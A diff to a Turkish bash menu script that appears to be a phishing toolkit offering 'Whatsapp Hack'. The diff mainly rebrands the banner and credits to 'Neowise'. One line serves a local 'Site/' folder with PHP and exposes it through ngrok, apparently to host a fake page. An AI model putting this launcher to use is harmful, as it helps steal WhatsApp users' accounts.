@@ -2,14 +2,12 @@
 
 clear
 echo -e '\033[32;40;1m
-        /\︵-︵/\
-        |( ◉)(◉)|
-        \ ︶V︶ /
-        /↺↺↺↺↺↺↺\
-        ↺↺↺↺↺↺↺↺|
-        \↺↺↺↺↺↺↺/
-        ¯¯/\¯/\¯¯
-
+        
+███    ██ ███████  ██████  ██     ██ ██ ███████ ███████ 
+████   ██ ██      ██    ██ ██     ██ ██ ██      ██      
+██ ██  ██ █████   ██    ██ ██  █  ██ ██ ███████ █████   
+██  ██ ██ ██      ██    ██ ██ ███ ██ ██      ██ ██      
+██   ████ ███████  ██████   ███ ███  ██ ███████ ███████ 
 
 
 \033[31;40;1m[01]\e[37mWhatsapp Hack 
@@ -19,7 +17,7 @@ echo -e '\033[32;40;1m
 \e[31m[99]\e[37m Exit
 
  '
-echo -e "\033[32;40;1m                      ~~~Yaman Efkar~~~"
+echo -e "\033[32;40;1m                      ~~~Neowise~~~"
 echo ""
 read -p "İslem Numarası : " islem
 if [[ $islem == 1 || $islem == 01 ]]; then
@@ -35,7 +33,7 @@ cd Site/
 php -S 127.0.0.1:$port > -t & ngrok http $port
 elif [[ $islem == 9 || $islem == 99 ]]; then
 clear
-echo -e "\e[31mTürk Siber Timi İyi Günler Diler :)) ßß"
+echo -e "\e[31mNeowise İyi Günler Diler :)) ßß"
 sleep 1 
 exit 1
 elif [[ $islem == 00 ]]; then
